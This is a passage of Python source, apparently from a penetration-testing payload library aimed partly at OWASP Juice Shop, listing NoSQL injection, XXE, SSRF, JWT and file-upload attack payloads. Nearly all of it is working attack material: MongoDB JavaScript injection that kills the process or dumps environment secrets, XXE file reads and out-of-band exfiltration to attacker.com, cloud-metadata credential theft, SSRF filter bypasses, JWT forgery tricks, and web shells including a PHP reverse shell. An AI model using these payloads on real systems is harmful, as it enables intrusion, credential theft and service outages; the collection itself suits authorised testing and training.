            tags=["nosqli", "json_injection", "login_bypass", "admin"],
        ))
        payloads.append(Payload(
            value='{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
            description="JSON body: regex username match with $ne password bypass",
            detection_hint="Login as user starting with 'admin' prefix",
            sub_type="json_body",
            severity="critical",
            tags=["nosqli", "json_injection", "login_bypass"],
        ))

        # ============================================================ #
        #  JavaScript Injection in MongoDB
        # ============================================================ #
        payloads.append(Payload(
            value="';return true;var a='",
            description="JavaScript injection: always return true in MongoDB $where context",
            detection_hint="Condition always true, all documents returned",
            sub_type="js_injection",
            severity="critical",
            tags=["nosqli", "javascript", "injection"],
        ))
        payloads.append(Payload(
            value="';sleep(5000);var a='",
            description="JavaScript time-based injection: 5 second sleep in MongoDB",
            detection_hint="Response delayed by ~5 seconds confirms JavaScript execution",
            sub_type="js_injection",
            severity="high",
            tags=["nosqli", "javascript", "time_based"],
        ))
        payloads.append(Payload(
            value="';return this.password;var a='",
            description="JavaScript injection to return password field directly",
            detection_hint="Password value returned in response through JavaScript evaluation",
            sub_type="js_injection",
            severity="critical",
            tags=["nosqli", "javascript", "data_extraction"],
        ))
        payloads.append(Payload(
            value="this.constructor.constructor('return process')().exit()",
            description="MongoDB server-side JavaScript RCE via constructor chain to process.exit",
            detection_hint="MongoDB process terminates, service becomes unavailable",
            sub_type="js_injection",
            severity="critical",
            tags=["nosqli", "javascript", "rce"],
        ))
        payloads.append(Payload(
            value="this.constructor.constructor('return process.env')().toString()",
            description="MongoDB JS injection: extract process environment variables",
            detection_hint="Environment variables with secrets returned through JS evaluation",
            sub_type="js_injection",
            severity="critical",
            tags=["nosqli", "javascript", "env_extraction"],
        ))
        payloads.append(Payload(
            value='{"$where": "function(){return true}"}',
            description="MongoDB $where with anonymous function returning true",
            detection_hint="All documents returned via function evaluation",
            sub_type="where",
            severity="critical",
            tags=["nosqli", "mongodb", "function"],
        ))
        payloads.append(Payload(
            value='{"$where": "sleep(5000) || true"}',
            description="MongoDB $where time-based blind injection with sleep",
            detection_hint="5 second delay confirms JavaScript execution in MongoDB",
            sub_type="where",
            severity="high",
            tags=["nosqli", "mongodb", "time_based"],
        ))

        # ============================================================ #
        #  NoSQL Blind Data Extraction
        # ============================================================ #
        payloads.append(Payload(
            value='{"username": "admin", "password": {"$regex": "^p"}}',
            description="NoSQL blind extraction: check if admin password starts with 'p'",
            detection_hint="Login success/failure reveals password characters one by one",
            sub_type="blind",
            severity="critical",
            tags=["nosqli", "blind", "password_extraction"],
        ))
        payloads.append(Payload(
            value='{"username": "admin", "password": {"$regex": "^pa"}}',
            description="NoSQL blind extraction: check if admin password starts with 'pa'",
            detection_hint="Successful login confirms first two characters of password",
            sub_type="blind",
            severity="critical",
            tags=["nosqli", "blind", "password_extraction"],
        ))
        payloads.append(Payload(
            value='{"username": {"$regex": "^.{0,5}$"}, "password": {"$gt": ""}}',
            description="NoSQL blind: enumerate usernames by length (0-5 chars)",
            detection_hint="Success/failure reveals if any username is 0-5 characters long",
            sub_type="blind",
            severity="high",
            tags=["nosqli", "blind", "username_enumeration"],
        ))

        return payloads

    # ================================================================== #
    #  XXE PAYLOADS (30+)
    # ================================================================== #
    def _build_xxe_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  File Read - Linux
        # ============================================================ #
        linux_xxe_targets = [
            ("/etc/passwd", "Linux user database", "root:x:0:0:root or similar entries"),
            ("/etc/shadow", "Linux password hashes (needs root)", "$6$ or $5$ hash format"),
            ("/etc/hostname", "System hostname", "Server hostname string"),
            ("/etc/hosts", "DNS mappings", "127.0.0.1 localhost or custom entries"),
            ("/etc/os-release", "OS information", "NAME=, VERSION_ID= fields"),
            ("/proc/self/environ", "Process environment variables", "PATH=, SECRET_KEY=, DATABASE_URL="),
            ("/proc/version", "Kernel version", "Linux version string"),
            ("/proc/self/cmdline", "Process command line", "Application startup command"),
            ("/proc/net/tcp", "Network connections", "Active TCP connections in hex"),
            ("/home/node/.env", "Node.js env file", "Application secrets and config"),
            ("/app/.env", "Application env file", "Database credentials, API keys"),
            ("/root/.ssh/authorized_keys", "SSH authorized keys", "Public SSH keys for root"),
        ]

        for filepath, desc, hint in linux_xxe_targets:
            payloads.append(Payload(
                value=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]><foo>&xxe;</foo>',
                description=f"XXE file read: {desc} ({filepath})",
                detection_hint=f"Response body contains {hint}",
                sub_type="file_read",
                os_specific="linux",
                severity="critical",
                tags=["xxe", "file_read", "linux"],
            ))

        # ============================================================ #
        #  File Read - Windows
        # ============================================================ #
        windows_xxe_targets = [
            ("c:/windows/win.ini", "Windows initialization file", "[fonts] or [extensions] sections"),
            ("c:/windows/system32/drivers/etc/hosts", "Windows hosts file", "localhost entries"),
            ("c:/boot.ini", "Windows boot configuration", "Boot loader configuration"),
            ("c:/inetpub/wwwroot/web.config", "IIS web config", "Connection strings, credentials"),
            ("c:/windows/system.ini", "Windows system config", "[drivers] section"),
        ]

        for filepath, desc, hint in windows_xxe_targets:
            payloads.append(Payload(
                value=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///{filepath}">]><foo>&xxe;</foo>',
                description=f"XXE file read Windows: {desc}",
                detection_hint=f"Response contains {hint}",
                sub_type="file_read",
                os_specific="windows",
                severity="critical",
                tags=["xxe", "file_read", "windows"],
            ))

        # ============================================================ #
        #  SSRF via XXE
        # ============================================================ #
        ssrf_xxe_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata endpoint", "ami-id, instance-id, etc."),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials", "AccessKeyId, SecretAccessKey"),
            ("http://169.254.169.254/latest/user-data", "AWS user-data", "Startup scripts, config"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", "Google Cloud instance data"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata", "Azure VM metadata"),
            ("http://127.0.0.1:8080/", "Localhost port 8080", "Internal service response"),
            ("http://127.0.0.1:3000/", "Localhost port 3000", "Internal dev service"),
            ("http://127.0.0.1:6379/", "Localhost Redis", "Redis service response"),
            ("http://127.0.0.1:9200/", "Localhost Elasticsearch", "Elasticsearch cluster info"),
            ("http://10.0.0.1/", "Internal network gateway", "Internal network device response"),
            ("http://192.168.1.1/", "Internal router", "Router admin page"),
        ]

        for url, desc, hint in ssrf_xxe_targets:
            payloads.append(Payload(
                value=f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]><foo>&xxe;</foo>',
                description=f"XXE SSRF: {desc}",
                detection_hint=f"Response contains {hint} from internal resource",
                sub_type="ssrf",
                severity="critical",
                tags=["xxe", "ssrf", "internal_access"],
            ))

        # ============================================================ #
        #  Billion Laughs / XML Bomb (DoS)
        # ============================================================ #
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>',
            description="Billion Laughs XML bomb (5 levels): exponential entity expansion DoS",
            detection_hint="Server timeout, memory exhaustion, high CPU, or crash",
            sub_type="dos",
            severity="high",
            tags=["xxe", "dos", "xml_bomb"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
            description="XXE DoS via /dev/random: infinite blocking read",
            detection_hint="Server hangs indefinitely trying to read random data",
            sub_type="dos",
            os_specific="linux",
            severity="high",
            tags=["xxe", "dos", "infinite_read"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/zero">]><foo>&xxe;</foo>',
            description="XXE DoS via /dev/zero: infinite null bytes",
            detection_hint="Server exhausts memory reading infinite null bytes",
            sub_type="dos",
            os_specific="linux",
            severity="high",
            tags=["xxe", "dos", "infinite_read"],
        ))

        # ============================================================ #
        #  Parameter Entity / Out-of-Band XXE
        # ============================================================ #
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%xxe;\'>">%eval;%exfil;]><foo>test</foo>',
            description="XXE out-of-band exfiltration: read file and send to attacker via parameter entity",
            detection_hint="HTTP request to attacker.com with file data in URL parameter",
            sub_type="oob",
            severity="critical",
            tags=["xxe", "oob", "exfiltration"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
            description="XXE external DTD loading: server fetches attacker-controlled DTD",
            detection_hint="DNS/HTTP request from server to attacker.com for DTD file",
            sub_type="oob",
            severity="critical",
            tags=["xxe", "oob", "external_dtd"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe-test">%xxe;]><foo>&test;</foo>',
            description="XXE out-of-band detection: confirm XXE by triggering external request",
            detection_hint="Any request from server to attacker confirms XXE vulnerability exists",
            sub_type="oob",
            severity="high",
            tags=["xxe", "oob", "detection"],
        ))

        # ============================================================ #
        #  PHP-Specific XXE
        # ============================================================ #
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            description="XXE with PHP filter: base64 encode file content to avoid XML parsing errors",
            detection_hint="Base64 encoded file content in response (decode to verify)",
            sub_type="php_filter",
            severity="critical",
            tags=["xxe", "php", "base64", "filter"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            description="XXE with PHP filter: read application source code (index.php)",
            detection_hint="Base64 encoded PHP source code in response",
            sub_type="php_filter",
            severity="critical",
            tags=["xxe", "php", "source_code"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
            description="XXE with PHP expect:// wrapper for command execution",
            detection_hint="Response contains output of whoami command (www-data, apache, etc.)",
            sub_type="rce",
            severity="critical",
            tags=["xxe", "php", "rce", "command_execution"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            description="XXE RCE via expect://: run 'id' command",
            detection_hint="Response contains uid=, gid= output from id command",
            sub_type="rce",
            severity="critical",
            tags=["xxe", "php", "rce", "command_execution"],
        ))

        # ============================================================ #
        #  XXE in Different Contexts
        # ============================================================ #
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><username>&xxe;</username><password>test</password></root>',
            description="XXE in structured XML document (login form context)",
            detection_hint="File content appears in response where username field is reflected",
            sub_type="context_specific",
            severity="critical",
            tags=["xxe", "login_context"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            description="XXE in SVG XML document",
            detection_hint="File content embedded in SVG text element",
            sub_type="context_specific",
            severity="critical",
            tags=["xxe", "svg"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>&xxe;</methodName></methodCall>',
            description="XXE in XML-RPC method call",
            detection_hint="File content in method name field of XML-RPC response",
            sub_type="context_specific",
            severity="critical",
            tags=["xxe", "xml_rpc"],
        ))
        payloads.append(Payload(
            value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
            description="XXE in SOAP envelope",
            detection_hint="File content in SOAP response body",
            sub_type="context_specific",
            severity="critical",
            tags=["xxe", "soap"],
        ))

        return payloads

    # ================================================================== #
    #  SSRF PAYLOADS (40+)
    # ================================================================== #
    def _build_ssrf_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Cloud Metadata Endpoints
        # ============================================================ #
        cloud_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata root", "ami-id, instance-id, hostname"),
            ("http://169.254.169.254/latest/meta-data/hostname", "AWS hostname", "Internal EC2 hostname"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM role list", "IAM role names"),
            ("http://169.254.169.254/latest/meta-data/iam/info", "AWS IAM info", "Instance profile ARN"),
            ("http://169.254.169.254/latest/user-data", "AWS user-data", "Startup scripts with secrets"),
            ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "AWS IMDSv1 creds", "AccessKeyId, SecretAccessKey, Token"),
            ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token endpoint", "IMDSv2 token (PUT required)"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root", "GCP instance info"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP service account token", "OAuth2 access token"),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP project ID", "Google Cloud project identifier"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS", "Azure VM metadata"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity token", "Azure OAuth token"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata", "Alibaba Cloud instance info"),
            ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack metadata", "OpenStack instance metadata"),
            ("http://169.254.169.254/v1.json", "DigitalOcean metadata", "Droplet metadata JSON"),
        ]

        for url, desc, hint in cloud_targets:
            payloads.append(Payload(
                value=url,
                description=f"SSRF cloud metadata: {desc}",
                detection_hint=f"Response contains {hint}. Confirms SSRF + cloud access",
                sub_type="cloud_metadata",
                severity="critical",
                tags=["ssrf", "cloud", "metadata", "credential_theft"],
            ))

        # ============================================================ #
        #  Localhost Port Scanning
        # ============================================================ #
        port_services = [
            (22, "SSH"),
            (80, "HTTP"),
            (443, "HTTPS"),
            (3000, "Node.js/Grafana"),
            (3306, "MySQL"),
            (5432, "PostgreSQL"),
            (5672, "RabbitMQ"),
            (6379, "Redis"),
            (8080, "HTTP Proxy/Tomcat"),
            (8443, "HTTPS Alt"),
            (8888, "Jupyter/Dev"),
            (9090, "Prometheus"),
            (9200, "Elasticsearch"),
            (9300, "Elasticsearch cluster"),
            (11211, "Memcached"),
            (27017, "MongoDB"),
            (5000, "Flask/Docker Registry"),
            (4000, "Dev Server"),
            (8000, "Django/Dev"),
            (1433, "MSSQL"),
            (1521, "Oracle"),
            (2375, "Docker API (unauth)"),
            (2376, "Docker API (TLS)"),
            (10250, "Kubernetes kubelet"),
            (10255, "Kubernetes kubelet (read-only)"),
        ]

        for port, service in port_services:
            payloads.append(Payload(
                value=f"http://127.0.0.1:{port}/",
                description=f"SSRF localhost port scan: {service} on port {port}",
                detection_hint=f"Response differs from connection-refused error = {service} is running on {port}",
                sub_type="port_scan",
                severity="high",
                tags=["ssrf", "port_scan", "localhost", service.lower().replace(" ", "_")],
            ))

        # ============================================================ #
        #  Internal Network Scanning
        # ============================================================ #
        internal_targets = [
            ("http://10.0.0.1/", "10.x.x.x gateway"),
            ("http://10.0.0.2/", "10.x.x.x second host"),
            ("http://172.16.0.1/", "172.16.x.x gateway"),
            ("http://172.17.0.1/", "Docker bridge gateway"),
            ("http://172.17.0.2/", "First Docker container"),
            ("http://192.168.0.1/", "192.168.0.x gateway"),
            ("http://192.168.1.1/", "192.168.1.x gateway/router"),
        ]

        for url, desc in internal_targets:
            payloads.append(Payload(
                value=url,
                description=f"SSRF internal network: {desc}",
                detection_hint="Response from internal network device differs from connection error",
                sub_type="internal_network",
                severity="high",
                tags=["ssrf", "internal", "network_scan"],
            ))

        # ============================================================ #
        #  Protocol Handler SSRF
        # ============================================================ #
        payloads.append(Payload(
            value="file:///etc/passwd",
            description="SSRF file:// protocol: read local Linux files",
            detection_hint="Local file content (root:x:0:0) returned in response",
            sub_type="protocol",
            os_specific="linux",
            severity="critical",
            tags=["ssrf", "protocol", "file_read"],
        ))
        payloads.append(Payload(
            value="file:///c:/windows/win.ini",
            description="SSRF file:// protocol: read local Windows files",
            detection_hint="win.ini content returned",
            sub_type="protocol",
            os_specific="windows",
            severity="critical",
            tags=["ssrf", "protocol", "file_read", "windows"],
        ))
        payloads.append(Payload(
            value="dict://127.0.0.1:6379/INFO",
            description="SSRF dict:// protocol: interact with Redis server",
            detection_hint="Redis INFO output with version, memory, clients info",
            sub_type="protocol",
            severity="critical",
            tags=["ssrf", "protocol", "redis"],
        ))
        payloads.append(Payload(
            value="dict://127.0.0.1:11211/stats",
            description="SSRF dict:// protocol: Memcached stats",
            detection_hint="Memcached statistics output",
            sub_type="protocol",
            severity="critical",
            tags=["ssrf", "protocol", "memcached"],
        ))
        payloads.append(Payload(
            value="gopher://127.0.0.1:6379/_INFO%0d%0a",
            description="SSRF gopher:// protocol: Redis INFO command via gopher",
            detection_hint="Redis INFO response through gopher protocol tunnel",
            sub_type="protocol",
            severity="critical",
            tags=["ssrf", "protocol", "gopher", "redis"],
        ))
        payloads.append(Payload(
            value="gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A",
            description="SSRF gopher:// with RESP protocol: proper Redis INFO command",
            detection_hint="Redis RESP protocol response with server information",
            sub_type="protocol",
            severity="critical",
            tags=["ssrf", "protocol", "gopher", "redis", "resp"],
        ))
        payloads.append(Payload(
            value="gopher://127.0.0.1:3306/_",
            description="SSRF gopher:// to MySQL: trigger MySQL handshake",
            detection_hint="MySQL handshake packet with version string",
            sub_type="protocol",
            severity="critical",
            tags=["ssrf", "protocol", "gopher", "mysql"],
        ))

        # ============================================================ #
        #  SSRF Filter Bypass
        # ============================================================ #
        bypass_payloads = [
            ("http://0x7f000001/", "Hex encoded 127.0.0.1", "hex"),
            ("http://2130706433/", "Decimal encoded 127.0.0.1", "decimal"),
            ("http://0177.0.0.1/", "Octal encoded 127.0.0.1", "octal"),
            ("http://0177.0.0.01/", "Mixed octal 127.0.0.1", "octal"),
            ("http://[::1]/", "IPv6 localhost", "ipv6"),
            ("http://[0:0:0:0:0:0:0:1]/", "Full IPv6 localhost", "ipv6"),
            ("http://[::ffff:127.0.0.1]/", "IPv4-mapped IPv6 localhost", "ipv6"),
            ("http://127.1/", "Shortened localhost (127.1 = 127.0.0.1)", "short"),
            ("http://127.0.1/", "Shortened localhost (127.0.1 = 127.0.0.1)", "short"),
            ("http://0/", "Zero resolves to 0.0.0.0 (all interfaces)", "zero"),
            ("http://0.0.0.0/", "All-interfaces address", "zero"),
            ("http://localhost/", "Localhost hostname", "hostname"),
            ("http://localhost.localdomain/", "Alternative localhost hostname", "hostname"),
            ("http://localtest.me/", "DNS that resolves to 127.0.0.1", "dns_rebind"),
            ("http://127.0.0.1.nip.io/", "nip.io DNS rebinding to 127.0.0.1", "dns_rebind"),
            ("http://spoofed.burpcollaborator.net/", "Burp Collaborator for OOB detection", "oob"),
            ("http://attacker.com@127.0.0.1/", "URL authority confusion: user@host", "authority"),
            ("http://127.0.0.1#@attacker.com/", "URL fragment confusion: host#@domain", "fragment"),
            ("http://127.0.0.1%23@attacker.com/", "URL encoded # for authority confusion", "encoded_fragment"),
            ("http://127。0。0。1/", "Fullwidth period (Unicode U+3002) bypass", "unicode"),
            ("http://①②⑦.⓪.⓪.①/", "Unicode circled digits for 127.0.0.1", "unicode"),
        ]

        for url, desc, bypass_type in bypass_payloads:
            payloads.append(Payload(
                value=url,
                description=f"SSRF bypass ({bypass_type}): {desc}",
                detection_hint=f"Resolves to localhost, bypassing '{bypass_type}' type SSRF filter",
                sub_type="bypass",
                severity="high",
                waf_bypass=True,
                tags=["ssrf", "bypass", bypass_type],
            ))

        # ============================================================ #
        #  SSRF to Specific Services
        # ============================================================ #
        payloads.append(Payload(
            value="http://127.0.0.1:2375/containers/json",
            description="SSRF to Docker API: list running containers",
            detection_hint="JSON array of Docker containers with names, IDs, images",
            sub_type="service_specific",
            severity="critical",
            tags=["ssrf", "docker", "container_escape"],
        ))
        payloads.append(Payload(
            value="http://127.0.0.1:2375/images/json",
            description="SSRF to Docker API: list Docker images",
            detection_hint="JSON array of Docker images with tags and sizes",
            sub_type="service_specific",
            severity="critical",
            tags=["ssrf", "docker"],
        ))
        payloads.append(Payload(
            value="http://127.0.0.1:10255/pods",
            description="SSRF to Kubernetes kubelet: list pods",
            detection_hint="JSON with pod details, container specs, secrets",
            sub_type="service_specific",
            severity="critical",
            tags=["ssrf", "kubernetes", "kubelet"],
        ))
        payloads.append(Payload(
            value="http://127.0.0.1:9200/_cat/indices",
            description="SSRF to Elasticsearch: list all indices",
            detection_hint="List of Elasticsearch indices with document counts",
            sub_type="service_specific",
            severity="high",
            tags=["ssrf", "elasticsearch"],
        ))
        payloads.append(Payload(
            value="http://127.0.0.1:9200/_search?q=*",
            description="SSRF to Elasticsearch: search all documents",
            detection_hint="Search results with document content from all indices",
            sub_type="service_specific",
            severity="critical",
            tags=["ssrf", "elasticsearch", "data_leak"],
        ))

        return payloads

    # ================================================================== #
    #  JWT ATTACK PAYLOADS (45+)
    # ================================================================== #
    def _build_jwt_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  None Algorithm Attacks
        # ============================================================ #
        none_variants = [
            ("none", "Lowercase none algorithm"),
            ("None", "Capital-N None algorithm"),
            ("NONE", "All-uppercase NONE"),
            ("nOnE", "Mixed case nOnE"),
            ("noNe", "Mixed case noNe"),
            ("NonE", "Mixed case NonE"),
            ("nONE", "Mixed case nONE"),
            ("nONe", "Mixed case nONe"),
        ]
        for alg, desc in none_variants:
            payloads.append(Payload(
                value=json.dumps({"alg": alg, "typ": "JWT"}),
                description=f"JWT {desc}: removes signature verification",
                detection_hint=f"Server accepts unsigned JWT with algorithm '{alg}'",
                sub_type="none_alg",
                severity="critical",
                tags=["jwt", "none_algorithm", "auth_bypass"],
            ))

        # ============================================================ #
        #  Algorithm Confusion (RS256 → HS256)
        # ============================================================ #
        alg_confusion_variants = [
            ("HS256", "HMAC SHA-256: use RS256 public key as HMAC secret"),
            ("HS384", "HMAC SHA-384: use RS384 public key as HMAC secret"),
            ("HS512", "HMAC SHA-512: use RS512 public key as HMAC secret"),
        ]
        for alg, desc in alg_confusion_variants:
            payloads.append(Payload(
                value=json.dumps({"alg": alg, "typ": "JWT"}),
                description=f"JWT algorithm confusion ({alg}): {desc}",
                detection_hint=f"Server accepts {alg}-signed token when expecting RS256. Public key used as HMAC secret",
                sub_type="alg_confusion",
                severity="critical",
                juice_shop=True,
                tags=["jwt", "algorithm_confusion", "key_confusion"],
            ))

        # ============================================================ #
        #  Common Weak Secrets for Brute Force
        # ============================================================ #
        weak_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "supersecret", "my_secret", "token_secret",
            "change_me", "jwt", "s3cr3t", "passw0rd", "default",
            "test", "1234567890", "qwerty", "abc123", "letmein",
            "welcome", "your-256-bit-secret", "secret-key",
            "my-secret-key", "jwt-secret", "HS256-secret",
            "keyboard cat", "shhhhh", "hmac-secret", "token",
            "api-secret", "signing-key", "auth-secret", "app-secret",
            "MySecretKey", "TheSecretKey", "JWT_SECRET",
            "JWT_SIGNING_KEY", "session-secret", "express-secret",
            "node-secret", "react-secret",
        ]
        for secret in weak_secrets:
            payloads.append(Payload(
                value=secret,
                description=f"JWT weak secret for brute force: '{secret}'",
                detection_hint=f"Token signed with '{secret}' accepted by server = weak secret confirmed",
                sub_type="weak_secret",
                severity="critical",
                tags=["jwt", "brute_force", "weak_secret"],
            ))

        # ============================================================ #
        #  JWT Payload Tampering
        # ============================================================ #
        payload_modifications = [
            ('{"sub":"admin","role":"admin","iat":9999999999}', "Escalate to admin role"),
            ('{"sub":"1","role":"admin","isAdmin":true}', "Add isAdmin:true claim"),
            ('{"sub":"admin","exp":99999999999}', "Far-future expiration (never expires)"),
            ('{"sub":"admin","role":"admin","email":"admin@juice-sh.op"}', "Set admin email (Juice Shop)"),
            ('{"sub":"1","role":"admin","iat":1,"exp":99999999999}', "Minimal iat + max exp + admin"),
            ('{"sub":"admin","role":"admin","iss":"juice-shop"}', "Custom issuer with admin role"),
            ('{"sub":"0","role":"admin"}', "User ID 0 with admin role"),
            ('{"sub":"admin","role":"admin","permissions":["*"]}', "Wildcard permissions claim"),
        ]
        for payload_val, desc in payload_modifications:
            payloads.append(Payload(
                value=payload_val,
                description=f"JWT payload tampering: {desc}",
                detection_hint="Server grants elevated access based on modified JWT claims",
                sub_type="payload_tampering",
                severity="critical",
                tags=["jwt", "privilege_escalation", "claim_tampering"],
            ))

        # ============================================================ #
        #  JWT Header Injection
        # ============================================================ #
        header_injections = [
            ('{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}',
             "kid path traversal to /dev/null: empty key file, sign with empty string"),
            ('{"alg":"HS256","typ":"JWT","kid":"/dev/null"}',
             "kid absolute path to /dev/null"),
            ('{"alg":"HS256","typ":"JWT","kid":"....//....//....//dev/null"}',
             "kid double-dot-slash traversal to /dev/null"),
            ('{"alg":"HS256","typ":"JWT","kid":"key\' UNION SELECT \'secret\' -- "}',
             "kid SQL injection: inject known secret value from UNION query"),
            ('{"alg":"HS256","typ":"JWT","kid":"key\' UNION SELECT \'\' -- "}',
             "kid SQL injection: inject empty string as key"),
            ('{"alg":"HS256","typ":"JWT","kid":"../../../../../../proc/sys/kernel/randomize_va_space"}',
             "kid traversal to /proc file (contains '2')"),
            ('{"alg":"HS256","typ":"JWT","jku":"http://attacker.com/jwks.json"}',
             "jku header injection: point to attacker-controlled JWKS endpoint"),
            ('{"alg":"HS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}',
             "x5u header injection: point to attacker certificate"),
            ('{"alg":"HS256","typ":"JWT","x5c":["MIIC..."]}',
             "x5c header injection: embed attacker certificate chain"),
            ('{"alg":"HS256","typ":"JWT","kid":"../../../../../../app/config/jwt-secret.txt"}',
             "kid traversal to application config directory"),
        ]
        for header_val, desc in header_injections:
            payloads.append(Payload(
                value=header_val,
                description=f"JWT header injection: {desc}",
                detection_hint="Server uses manipulated header value for key lookup or verification",
                sub_type="header_injection",
                severity="critical",
                tags=["jwt", "header_injection"],
            ))

        # ============================================================ #
        #  Juice Shop JWT Specific
        # ============================================================ #
        payloads.append(Payload(
            value='{"alg":"RS256","typ":"JWT"}',
            description="Juice Shop JWT: original RS256 algorithm (discover public key first)",
            detection_hint="Juice Shop uses RS256 - get public key from /encryptionkeys/jwt.pub",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["jwt", "juice_shop", "rs256"],
        ))
        payloads.append(Payload(
            value='{"alg":"HS256","typ":"JWT"}',
            description="Juice Shop JWT algorithm confusion: RS256→HS256 using public key as secret",
            detection_hint="Sign with HS256 using jwt.pub content as secret key. Server accepts token",
            sub_type="juice_shop",
            severity="critical",
            juice_shop=True,
            tags=["jwt", "juice_shop", "algorithm_confusion"],
        ))

        return payloads

    # ================================================================== #
    #  FILE UPLOAD PAYLOADS (35+)
    # ================================================================== #
    def _build_file_upload_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Web Shell Payloads
        # ============================================================ #
        webshells = [
            ('<?php system($_GET["cmd"]); ?>', "PHP system() web shell: execute OS commands via ?cmd=whoami"),
            ('<?php echo shell_exec($_GET["cmd"]); ?>', "PHP shell_exec() web shell: returns command output"),
            ("<?php eval($_POST['code']); ?>", "PHP eval() shell: execute arbitrary PHP code via POST"),
            ('<?=`$_GET[0]`?>', "Minimal PHP backtick shell: shortest possible (13 chars)"),
            ('<?php passthru($_GET["cmd"]); ?>', "PHP passthru() shell: raw command output"),
            ('<?php $sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>', "PHP reverse shell: connect back to attacker"),
            ('<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', "JSP web shell: Java command execution"),
            ('<% import os; os.system(request.GET["cmd"]) %>', "Python/Jinja web shell"),
            ('<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>', "ASPX web shell: C# command execution"),
        ]
        for shell_code, desc in webshells:
            payloads.append(Payload(
                value=shell_code,
                description=f"Web shell: {desc}",
                detection_hint="Uploaded file executes server-side code when accessed via URL",
                sub_type="webshell",
                severity="critical",
                tags=["file_upload", "webshell", "rce"],
            ))

        # ============================================================ #
        #  Extension Bypass Filenames
        # ============================================================ #
        extension_bypasses = [
